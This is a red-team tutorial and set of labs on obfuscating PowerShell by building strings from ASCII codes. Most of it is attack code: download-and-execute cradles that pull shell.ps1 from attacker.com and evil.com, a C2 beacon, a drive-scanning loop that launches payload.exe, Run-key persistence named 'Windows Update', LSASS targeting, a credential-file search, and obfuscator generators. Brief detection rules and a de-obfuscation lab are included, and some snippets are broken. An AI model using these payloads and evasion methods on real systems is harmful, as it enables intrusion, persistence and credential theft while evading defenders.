# ASCII Enumeration Techniques: Theory & Practice
### Mr_Malman

## Overview
ASCII enumeration is an obfuscation technique that converts numeric ASCII values into characters dynamically, allowing code to hide readable strings and sensitive commands behind numeric ranges.

---

## Part 1: Fundamentals

### What is ASCII?
ASCII (American Standard Code for Information Exchange) is a character encoding standard where each character has a numeric value:

```
'A' = 65    'Z' = 90    'a' = 97    'z' = 122
'0' = 48    '9' = 57    ' ' = 32    ':' = 58
```

### The Core Concept
Instead of writing:
```powershell
$cmd = "cmd.exe"
```

You write:
```powershell
$cmd = [char]99 + [char]109 + [char]100 + [char]46 + [char]101 + [char]120 + [char]101
```

Both evaluate to `"cmd.exe"`, but the second hides the literal string.

---

## Part 2: ASCII Enumeration Methods

### Method 1: Range + ForEach Loop (Your dope_shope example)

**Pattern:**
```powershell
<start_ascii>..<end_ascii> | ForEach-Object { [char]$_ }
```

**Example: Build drive letters D: through Z:**
```powershell
68..90 | ForEach-Object { [char]$_ }
# Output: D E F G H I J K L M N O P Q R S T U V W X Y Z
```

**Why it works:**
- `68..90` generates: 68, 69, 70, 71, ... 90
- `[char]$_` converts each number to its ASCII character
- Result: a sequence of all uppercase letters from D to Z

**Real-world usage (from dope_shope):**
```powershell
68..90 | ForEach-Object {
    $d = [char]$_ + ':'  # Build D:, E:, F:, etc.
    if(Test-Path($d + '\payload.exe')) {
        Start-Process ($d + '\payload.exe')
    }
}
```

**Evasion benefit:** Static analysis tools see "68..90" not "drive letters D-Z"

---

### Method 2: Join Characters

**Pattern:**
```powershell
[char[]](<ascii_array>) -join ''
```

**Example: Build "cmd.exe"**
```powershell
[char[]]@(99, 109, 100, 46, 101, 120, 101) -join ''
# Output: cmd.exe
```

**How it works:**
- `@(99, 109, 100, ...)` is an array of ASCII values
- `[char[]]` casts the array to characters
- `-join ''` concatenates them with no separator

**Real-world usage:**
```powershell
$command = [char[]]@(99, 109, 100, 46, 101, 120, 101) -join ''
Invoke-Expression $command  # Executes cmd.exe
```

---

### Method 3: Individual Character Concatenation

**Pattern:**
```powershell
[char]<value> + [char]<value> + ...
```

**Example: Build "powershell"**
```powershell
[char]112 + [char]111 + [char]119 + [char]101 + [char]114 + [char]115 + [char]104 + [char]101 + [char]108 + [char]108
# Output: powershell
```

---

### Method 4: Range with String Building (Flexible)

**Pattern:**
```powershell
$result = ''
65..70 | ForEach-Object { $result += [char]$_ }
# Output: ABCDEF
```

**Advanced example: Build multiple words**
```powershell
$result = ''
# 'A' to 'Z'
65..90 | ForEach-Object { $result += [char]$_ }
# Add space
$result += [char]32
# 'a' to 'z'
97..122 | ForEach-Object { $result += [char]$_ }
# Output: ABCDEFGHIJKLMNOPQRSTUVWXYZ abcdefghijklmnopqrstuvwxyz
```

---

## Part 3: Practical Implementation

### Converting Text to ASCII Enumeration

**Step 1: Identify the string**
```
String: "cmd.exe"
```

**Step 2: Get ASCII values**
```
c = 99
m = 109
d = 100
. = 46
e = 101
x = 120
e = 101
```

**Step 3: Choose encoding method**

**Method A (Join):**
```powershell
[char[]]@(99, 109, 100, 46, 101, 120, 101) -join ''
```

**Method B (Concatenation):**
```powershell
[char]99 + [char]109 + [char]100 + [char]46 + [char]101 + [char]120 + [char]101
```

**Method C (Loop):**
```powershell
$s = ''; 99, 109, 100, 46, 101, 120, 101 | ForEach-Object { $s += [char]$_ }; $s
```

---

### Practical Payload Example: Hidden Command Execution

**Original (Detectable):**
```powershell
cmd.exe /c "powershell.exe -Command 'IEX(New-Object Net.WebClient).DownloadString(\"http://attacker.com/shell.ps1\")'"
```

**Obfuscated with ASCII enumeration:**
```powershell
$cmd = [char[]]@(99, 109, 100) -join ''  # cmd
$ps = [char[]]@(112, 111, 119, 101, 114, 115, 104, 101, 108, 108) -join ''  # powershell
$url = [char[]]@(104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107, 101, 114, 46, 99, 111, 109) -join ''  # http://attacker.com

& $cmd /c "$ps -Command 'IEX(New-Object Net.WebClient).DownloadString(\"$url/shell.ps1\")'"
```

**Why this is effective:**
- YARA rules looking for "cmd.exe" won't match
- Static analysis sees numeric arrays, not command strings
- String-based detection is bypassed

---

## Part 4: Detection Evasion Applications

### Application 1: Registry Key Obfuscation

**Goal:** Hide registry paths from detection

```powershell
# Original (detectable):
$regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"

# Obfuscated:
$hklm = [char[]]@(72, 75, 76, 77) -join ''  # HKLM
$path = [char[]]@(83, 111, 102, 116, 119, 97, 114, 101) -join ''  # Software
$regPath = "$hklm`:\$path\Microsoft\Windows\CurrentVersion\Run"
```

### Application 2: Process Name Hiding

```powershell
# Original:
Get-Process | Where-Object {$_.Name -eq "svchost"}

# Obfuscated:
$processName = [char[]]@(115, 118, 99, 104, 111, 115, 116) -join ''  # svchost
Get-Process | Where-Object {$_.Name -eq $processName}
```

### Application 3: File Path Obfuscation

```powershell
# Original:
$payload = Get-Content "C:\Windows\Temp\payload.exe"

# Obfuscated:
$temp = [char[]]@(84, 101, 109, 112) -join ''  # Temp
$payload = Get-Content "C:\Windows\$temp\payload.exe"
```

### Application 4: API Call Obfuscation

```powershell
# Original:
[DllImport("kernel32.dll")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

# Obfuscated (in C#):
$kernel32 = [char[]]@(107, 101, 114, 110, 101, 108, 51, 50, 46, 100, 108, 108) -join ''
[DllImport($kernel32)]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
```

---

## Part 5: Advanced Techniques

### Technique 1: Nested Enumeration

Combine multiple ranges to build complex strings:

```powershell
# Build "cmd.exe /c powershell"
$obfuscated = (
    [char[]]@(99, 109, 100) -join '',     # cmd
    [char]32,                              # space
    [char]47,                              # /
    [char]99,                              # c
    [char]32,                              # space
    [char[]]@(112, 111, 119, 101, 114, 115, 104, 101, 108, 108) -join ''  # powershell
) -join ''
```

### Technique 2: XOR + ASCII Enumeration

Combine XOR encoding with ASCII enumeration for deeper obfuscation:

```powershell
# Original payload hidden with XOR key
$xorKey = 0x42
$encoded = @(99, 109, 100) | ForEach-Object { $_ -bxor $xorKey }  # XOR each byte

# Decode and execute
$decoded = $encoded | ForEach-Object { [char]($_ -bxor $xorKey) }
$command = $decoded -join ''
```

### Technique 3: Base64 + ASCII Enumeration

Combine base64 encoding with ASCII obfuscation:

```powershell
# Encode: "cmd.exe" → base64 → ASCII values
$base64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("cmd.exe"))
$ascii_vals = [char[]]$base64 | ForEach-Object { [int][char]$_ }

# Hide the base64 decoder too:
$decoder = [char[]]@(84, 101, 120, 116, 46, 69, 110, 99, 111, 100, 105, 110, 103) -join ''  # Text.Encoding
# Decode at runtime
$decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($base64))
```

---

## Part 6: Detection Engineering

### Detection Rule 1: Pattern-Based Detection

**Detectable pattern:** Numeric arrays being converted to characters

```yara
rule Suspicious_ASCII_Enumeration {
    strings:
        $pattern1 = "[char[]]@(" nocase
        $pattern2 = "[char[]](" nocase
        $pattern3 = "| ForEach-Object { [char]" nocase
        $pattern4 = "-join ''" nocase
    condition:
        all of them
}
```

### Detection Rule 2: Behavioral Detection

Monitor PowerShell execution for:
1. Large numeric arrays in scripts
2. Frequent `[char]` casting operations
3. String concatenation from numeric values
4. Arrays with 50+ elements being converted to strings

### Detection Rule 3: Log-Based Detection

```powershell
# PowerShell Operational Log (Event ID 4104)
# Look for patterns:
# - "..| ForEach" OR "..| %" (range + loop)
# - "[char]" appearing 5+ times in single script block
# - "@(" with numeric-only content
```

---

## Part 7: Use Cases in Red Teaming

### Use Case 1: Initial Access Payload (Your dope_shope example)
```powershell
# Hide drive enumeration logic
68..90 | ForEach-Object {
    $drive = [char]$_ + ':'
    if(Test-Path($drive + '\payload.exe')) {
        Start-Process ($drive + '\payload.exe')
    }
}
```

### Use Case 2: C2 Communication
```powershell
# Hide C2 domain
$c2 = [char[]]@(97, 116, 116, 97, 99, 107, 101, 114, 46, 99, 111, 109) -join ''
$url = [char[]]@(104, 116, 116, 112, 58, 47, 47) -join '' + $c2
```

### Use Case 3: Credential Harvesting
```powershell
# Hide registry paths used for credential dumping
$lsass = [char[]]@(76, 83, 65, 83, 83) -join ''
Get-Process | Where-Object { $_.Name -eq $lsass }
```

### Use Case 4: Lateral Movement
```powershell
# Hide remote service paths
$admin_share = [char[]]@(92, 92) -join '' + $target + [char[]]@(92, 65, 68, 77, 73, 36) -join ''
```

---

## Part 8: Tools & Automation

### PowerShell Function: String to ASCII Converter

```powershell
function Convert-StringToASCII {
    param([string]$String)
    
    $ascii_values = [char[]]$String | ForEach-Object { [int][char]$_ }
    
    # Output as array format
    Write-Output "[char[]]@($($ascii_values -join ', ')) -join ''"
    
    # Also output as range format (if consecutive)
    Write-Output "ASCII Values: $($ascii_values -join ', ')"
}

# Usage:
Convert-StringToASCII "cmd.exe"
# Output: [char[]]@(99, 109, 100, 46, 101, 120, 101) -join ''
# ASCII Values: 99, 109, 100, 46, 101, 120, 101
```

### Python Script: ASCII Enumeration Generator

```python
def string_to_ascii_enum(text, method="join"):
    """Convert string to ASCII enumeration PowerShell code"""
    ascii_values = [str(ord(c)) for c in text]
    
    if method == "join":
        return f"[char[]]@({', '.join(ascii_values)}) -join ''"
    elif method == "concat":
        return " + ".join([f"[char]{val}" for val in ascii_values])
    elif method == "loop":
        values = ", ".join(ascii_values)
        return f"$s = ''; {values} | ForEach-Object {{ $s += [char]$_ }}; $s"
    
    return None

# Usage:
print(string_to_ascii_enum("payload.exe", "join"))
# Output: [char[]]@(112, 97, 121, 108, 111, 97, 100, 46, 101, 120, 101) -join ''
```

---

## Part 9: Defensive Recommendations

### Recommendation 1: Block Suspicious Patterns
```powershell
# GPO/AppLocker rule to block scripts with:
# - "[char[]]@(" patterns
# - Numeric arrays 50+ elements
# - Multiple [char] casts in single script
```

### Recommendation 2: Monitor Execution Context
```powershell
# Enable PowerShell logging at DEBUG level:
# - Event 4104 (Script Block Logging)
# - Event 4688 (Process Creation)
# Monitor for scripts with numeric obfuscation patterns
```

### Recommendation 3: Behavioral Analysis
```
Alert on:
1. PowerShell building strings from numbers
2. Accessing registry with obfuscated paths
3. Spawning child processes from obfuscated command strings
4. Network connections to obfuscated domains
```

---

## Summary Table: ASCII Enumeration Methods

| Method | Syntax | Evasion | Readability | Performance |
|--------|--------|---------|-------------|-------------|
| **Range + ForEach** | `65..90\|%{[char]$_}` | High | Low | Good |
| **Array + Join** | `[char[]]@(65,66,67)-join''` | High | Medium | Good |
| **Concatenation** | `[char]65+[char]66` | Medium | Low | Poor (many + ops) |
| **Loop Building** | `$s='';65,66\|%{$s+=[char]$_}` | High | Low | Poor |

---

## References & Further Learning

1. **MITRE ATT&CK:**
   - T1027 - Obfuscated Files or Information
   - T1059.001 - Command and Scripting Interpreter: PowerShell

2. **Detection Engineering:**
   - Elastic Common Signals: PowerShell character encoding
   - Splunk: Detection for obfuscated PowerShell

3. **Research Papers:**
   - "Living off the Land: A Minimal Malware" (practical evasion techniques)
   - PowerShell security research from Microsoft's Threat Intelligence team

---

## Practice Exercises

### Exercise 1: Obfuscate a Malware Command
Take a malicious command and convert 3 key strings using ASCII enumeration:
```
Original: cmd.exe /c "powershell.exe -Command Get-ChildItem"
Task: Obfuscate cmd.exe, powershell.exe, and Get-ChildItem
```

### Exercise 2: Detection Challenge
Write a detection rule (YARA/Splunk/Elastic) that catches ASCII enumeration patterns while minimizing false positives.

### Exercise 3: Advanced Evasion
Combine ASCII enumeration with base64 encoding to hide a reverse shell command.

---

## Conclusion

ASCII enumeration is a **fundamental obfuscation technique** in offensive security that:
- Hides literal strings from static analysis
- Bypasses simple keyword-based detection
- Works across all PowerShell environments
- Combines well with other obfuscation methods

Mastering it is essential for payload development, detection evasion, and understanding modern malware techniques.

# ASCII Enumeration: Practical Examples & Lab Exercises

## Lab 1: Basic ASCII Conversion

### Objective
Convert simple strings to ASCII enumeration and execute them.

### Step 1: Understand ASCII Values

```powershell
# Method 1: Get ASCII value of a character
[int][char]'A'
# Output: 65

[int][char]'Z'
# Output: 90

[int][char]'a'
# Output: 97

[int][char]'z'
# Output: 122

# Method 2: Get all ASCII values from a string
$text = "cmd"
[char[]]$text | ForEach-Object { [int][char]$_ }
# Output: 99 109 100
```

### Step 2: Build a String from ASCII Values

```powershell
# Method A: Using -join
[char[]]@(99, 109, 100) -join ''
# Output: cmd

# Method B: Using ForEach concatenation
$result = ''; 99, 109, 100 | ForEach-Object { $result += [char]$_ }; $result
# Output: cmd

# Method C: Using range (if consecutive)
$result = ''; 65..70 | ForEach-Object { $result += [char]$_ }; $result
# Output: ABCDEF
```

### Step 3: Execute Hidden Commands

```powershell
# Create obfuscated command
$cmd_bytes = @(99, 109, 100)  # "cmd"
$cmd = [char[]]$cmd_bytes -join ''

# Execute it
& $cmd /c dir
```

---

## Lab 2: Multi-Character Obfuscation

### Objective
Hide longer command strings and analyze detection vectors.

### Example: Hide "calc.exe"

```powershell
# Step 1: Get ASCII values
$string = "calc.exe"
$ascii = [char[]]$string | ForEach-Object { [int][char]$_ }
Write-Output $ascii
# Output: 99 97 108 99 46 101 120 101

# Step 2: Build the obfuscated payload
$calc = [char[]]@(99, 97, 108, 99, 46, 101, 120, 101) -join ''
Write-Output $calc
# Output: calc.exe

# Step 3: Execute it
Start-Process $calc
```

### Example: Hide Full Command with Arguments

```powershell
# Original (DETECTABLE):
cmd.exe /c powershell.exe -NoProfile -WindowStyle Hidden -Command "whoami"

# Obfuscated approach:
$cmd = [char[]]@(99, 109, 100) -join ''  # cmd
$ps = [char[]]@(112, 111, 119, 101, 114, 115, 104, 101, 108, 108) -join ''  # powershell
$arg1 = [char]47 + [char]99  # /c

$final_cmd = $cmd + [char]32 + $arg1 + [char]32 + $ps
& $cmd $arg1 $ps -NoProfile -WindowStyle Hidden -Command "whoami"
```

---

## Lab 3: Drive Letter Enumeration (dope_shope Pattern)

### Objective
Understand how dope_shope uses ASCII enumeration for multi-drive payload scanning.

### Basic Pattern

```powershell
# ASCII values for drive letters:
# D = 68, E = 69, F = 70, ... Z = 90

# Method 1: Simple enumeration
68..90 | ForEach-Object {
    $letter = [char]$_
    Write-Output $letter
}
# Output: D E F G H I J K L M N O P Q R S T U V W X Y Z

# Method 2: Build drive paths
68..90 | ForEach-Object {
    $drive = [char]$_ + ':'
    Write-Output $drive
}
# Output: D: E: F: G: ... Z:
```

### Full dope_shope Pattern with Comments

```powershell
# Scan D: through Z: for payload.exe and execute
68..90 | ForEach-Object {
    # $_ is current ASCII value (68, 69, 70, etc.)
    # [char]$_ converts to character (D, E, F, etc.)
    $drive_letter = [char]$_
    
    # Add colon to make valid drive letter
    $drive_path = $drive_letter + ':'
    
    # Build full path to payload
    $payload_path = $drive_path + '\payload.exe'
    
    # Check if file exists on this drive
    if (Test-Path $payload_path) {
        Write-Output "[+] Found payload at: $payload_path"
        
        # Execute the payload
        Start-Process $payload_path
        
        # Optional: break after first success
        # break
    }
}
```

### Practical Example: Multi-Drive Lateral Movement

```powershell
# Search for sensitive files across multiple drives
68..90 | ForEach-Object {
    $drive = [char]$_ + ':'
    
    # Skip if drive doesn't exist
    if (-not (Test-Path $drive)) { return }
    
    # Search for .txt files containing credentials
    Get-ChildItem -Path $drive -Filter "*.txt" -Recurse -ErrorAction SilentlyContinue |
        ForEach-Object {
            if ($_.FullName -match 'password|cred|secret|admin') {
                Write-Output "Found: $($_.FullName)"
            }
        }
}
```

---

## Lab 4: Registry Obfuscation

### Objective
Hide registry paths from detection systems.

### Example: Obfuscate "HKLM:\Software\Microsoft"

```powershell
# Original (DETECTABLE):
$regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"

# ASCII method:
# H=72, K=75, L=76, M=77, S=83, o=111, f=102, t=116, w=119, a=97, r=114, e=101
$hklm = [char[]]@(72, 75, 76, 77) -join ''  # HKLM
$soft = [char[]]@(83, 111, 102, 116, 119, 97, 114, 101) -join ''  # Software

# Build registry path dynamically
$regPath = "$hklm`:\$soft\Microsoft\Windows\CurrentVersion\Run"

# Use it
Get-ItemProperty -Path $regPath
```

### Real-world: Hide Persistence Mechanism

```powershell
# Original (DETECTABLE):
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Windows Update" -Value "C:\temp\malware.exe"

# Obfuscated:
$hkcu = [char[]]@(72, 75, 67, 85) -join ''  # HKCU
$run = [char[]]@(82, 117, 110) -join ''  # Run
$name = [char[]]@(87, 105, 110, 100, 111, 119, 115, 32, 85, 112, 100, 97, 116, 101) -join ''  # Windows Update

$regPath = "$hkcu`:\Software\Microsoft\Windows\CurrentVersion\$run"
New-ItemProperty -Path $regPath -Name $name -Value "C:\temp\malware.exe"
```

---

## Lab 5: Process Enumeration Hiding

### Objective
Hide process queries from behavioral detection.

### Example: Hide "svchost" Detection

```powershell
# Original (DETECTABLE):
Get-Process | Where-Object { $_.Name -eq "svchost" }

# Obfuscated:
$process_name = [char[]]@(115, 118, 99, 104, 111, 115, 116) -join ''  # svchost
Get-Process | Where-Object { $_.Name -eq $process_name }
```

### Advanced: Hide LSASS Dumping

```powershell
# Goal: Find and dump LSASS without writing "lsass" to logs

# Method 1: ASCII-obfuscated name
$target_process = [char[]]@(108, 115, 97, 115, 115) -join ''  # lsass
$lsass_proc = Get-Process -Name $target_process

# Method 2: Get PID (commonly used in tools)
$pid = $lsass_proc.Id
Write-Output "LSASS PID: $pid"

# Method 3: Extract credentials (pseudo-code)
# This would call Windows APIs to dump memory
```

---

## Lab 6: Network Communication Obfuscation

### Objective
Hide C2 domains and URLs from detection.

### Example: Hide C2 Domain

```powershell
# Original (DETECTABLE):
$url = "http://attacker.com/beacon"

# Obfuscated with ASCII:
# a=97, t=116, t=116, a=97, c=99, k=107, e=101, r=114, .=46, c=99, o=111, m=109
$domain = [char[]]@(97, 116, 116, 97, 99, 107, 101, 114, 46, 99, 111, 109) -join ''  # attacker.com

$proto = [char[]]@(104, 116, 116, 112) -join ''  # http
$url = "$proto`://$domain/beacon"

# Use it
Invoke-WebRequest -Uri $url
```

### Real-world: Hide Malicious URL in Script

```powershell
# Build URL components dynamically
$scheme = [char[]]@(104, 116, 116, 112, 115) -join ''  # https
$domain = [char[]]@(101, 118, 105, 108, 46, 99, 111, 109) -join ''  # evil.com
$path = [char[]]@(47, 115, 104, 101, 108, 108) -join ''  # /shell
$ext = [char[]]@(46, 112, 115, 49) -join ''  # .ps1

$malicious_url = "$scheme`://$domain$path$ext"

# Download and execute
IEX (New-Object Net.WebClient).DownloadString($malicious_url)
```

---

## Lab 7: Combining Obfuscation Techniques

### Objective
Layer ASCII enumeration with other evasion techniques.

### Technique 1: ASCII + Base64

```powershell
# Step 1: Create payload
$payload = "Get-Process; whoami"

# Step 2: Encode to Base64
$b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($payload))

# Step 3: Obfuscate the decoder command
$ps = [char[]]@(112, 111, 119, 101, 114, 115, 104, 101, 108, 108) -join ''  # powershell
$enc = [char[]]@(45, 69, 110, 99, 111, 100, 101, 100, 67, 111, 109, 109, 97, 110, 100) -join ''  # -EncodedCommand

# Step 4: Execute
& $ps $enc $b64
```

### Technique 2: ASCII + Variable Names

```powershell
# Hide variable names too
$_1 = [char[]]@(99, 109, 100) -join ''  # cmd
$_2 = [char[]]@(47, 99) -join ''  # /c
$_3 = [char[]]@(100, 105, 114) -join ''  # dir

# Execute with obfuscated variable references
& $_1 $_2 $_3
```

### Technique 3: ASCII + Array Slicing

```powershell
# Hide specific characters within larger arrays
$alphabet = 65..122  # All ASCII values from A-z

# Extract specific characters using indices
$c = [char]$alphabet[33]  # Get 'c' (99th ASCII value)
$m = [char]$alphabet[44]  # Get 'm' (109th ASCII value)
$d = [char]$alphabet[35]  # Get 'd' (100th ASCII value)

$cmd = "$c$m$d"  # Build "cmd"
```

---

## Lab 8: Detection Testing

### Objective
Understand how to test your obfuscation against detection systems.

### Test 1: String-Based Detection

```powershell
# Original (easily detected):
Get-Process svchost

# Test against YARA rule checking for "svchost" literal:
$process = [char[]]@(115, 118, 99, 104, 111, 115, 116) -join ''
Get-Process $process
# Expected: YARA misses it, but behavioral detection might catch it
```

### Test 2: Pattern-Based Detection

```powershell
# Test if detection catches the obfuscation pattern itself
$suspicious = [char[]]@(99, 109, 100) -join ''
# Detection: Look for "[char[]]@(" pattern, not the content

# Workaround: Use different method
$less_sus = ''; 99, 109, 100 | ForEach-Object { $less_sus += [char]$_ }
# This pattern is less commonly detected
```

### Test 3: Behavioral Analysis

```powershell
# What detections should catch this?
$registry = [char[]]@(82, 101, 103, 105, 115, 116, 114, 121) -join ''  # Registry
$path = [char[]]@(72, 75, 76, 77, 92, 83, 111, 102, 116, 119, 97, 114, 101) -join ''  # HKLM\Software

# Behavioral: Even if string is obfuscated, registry access is still logged
New-ItemProperty -Path "Registry::$path\Microsoft\Windows\CurrentVersion\Run" -Name "Malware"
# Expected: Event 4657 (Registry value created/modified) will be logged
```

---

## Lab 9: Reverse Engineering Obfuscated Code

### Objective
Learn to de-obfuscate ASCII enumeration in malware.

### Example: Analyze Suspicious Script

```powershell
# Given this suspicious script block:
68..90|%{$d=[char]$_;if(Test-Path($d+':\payload.exe')){Start-Process($d+':\payload.exe')}}

# De-obfuscation steps:
# 1. Identify the range: 68..90 = ASCII D-Z
# 2. Identify the operation: Testing path on each drive, executing if found
# 3. Rewrite for clarity:
#    FOR each drive letter from D to Z:
#      IF file \payload.exe exists:
#        THEN execute it

# De-obfuscated version:
foreach ($ascii in 68..90) {
    $drive = [char]$ascii
    $path = $drive + ':\payload.exe'
    if (Test-Path $path) {
        Start-Process $path
    }
}
```

### Exercise: Decode This Obfuscated String

```powershell
# Given:
[char[]]@(110, 101, 116, 32, 117, 115, 101, 114) -join ''

# Steps to decode:
# 110, 101, 116 = "net"
# 32 = space
# 117, 115, 101, 114 = "user"
# Result: "net user"

# Verify:
$result = [char[]]@(110, 101, 116, 32, 117, 115, 101, 114) -join ''
Write-Output $result
# Output: net user
```

---

## Lab 10: Building Your Own Tools

### Mini Tool: PowerShell String Obfuscator

```powershell
function Obfuscate-String {
    param(
        [string]$String,
        [ValidateSet("join", "concat", "loop")]
        [string]$Method = "join"
    )
    
    # Convert string to ASCII values
    $ascii_array = [char[]]$String | ForEach-Object { [int][char]$_ }
    $ascii_string = $ascii_array -join ', '
    
    switch ($Method) {
        "join" {
            "[char[]]@($ascii_string) -join ''"
        }
        "concat" {
            $chars = $ascii_array | ForEach-Object { "[char]$_" }
            $chars -join " + "
        }
        "loop" {
            "`$s = ''; $ascii_string | ForEach-Object { `$s += [char]`$_ }; `$s"
        }
    }
}

# Usage:
Obfuscate-String "cmd.exe" -Method join
# Output: [char[]]@(99, 109, 100, 46, 101, 120, 101) -join ''

Obfuscate-String "powershell" -Method loop
# Output: $s = ''; 112, 111, 119, 101, 114, 115, 104, 101, 108, 108 | ForEach-Object { $s += [char]$_ }; $s
```

### Mini Tool: Batch Converter

```powershell
function Convert-MultipleStrings {
    param([string[]]$Strings)
    
    $results = @{}
    foreach ($str in $Strings) {
        $ascii = [char[]]$str | ForEach-Object { [int][char]$_ }
        $results[$str] = "[char[]]@($($ascii -join ', ')) -join ''"
    }
    return $results
}

# Usage:
$payload_strings = @("cmd.exe", "powershell", "payload")
$obfuscated = Convert-MultipleStrings $payload_strings

foreach ($item in $obfuscated.GetEnumerator()) {
    Write-Output "$($item.Key) => $($item.Value)"
}
```

---

## Summary: What You've Learned

 Basic ASCII value conversion  
 Multiple obfuscation methods (join, concat, loop, range)  
 Drive letter enumeration (dope_shope pattern)  
 Registry and file path hiding  
 Process and service obfuscation  
 Network communication masking  
 Combining techniques for defense evasion  
 Detection testing methods  
 De-obfuscation and reverse engineering  
 Building your own obfuscation tools  

---